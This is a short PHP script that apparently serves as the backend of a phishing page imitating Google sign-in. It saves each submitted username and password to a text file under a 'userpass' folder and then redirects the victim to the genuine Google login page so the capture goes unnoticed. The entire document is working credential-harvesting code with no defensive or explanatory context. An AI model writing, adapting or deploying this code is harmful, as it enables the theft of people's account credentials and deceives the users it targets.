<?php

file_put_contents("../userpass/usernames.txt", "Google Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://accounts.google.com/v3/signin/identifier');
exit();
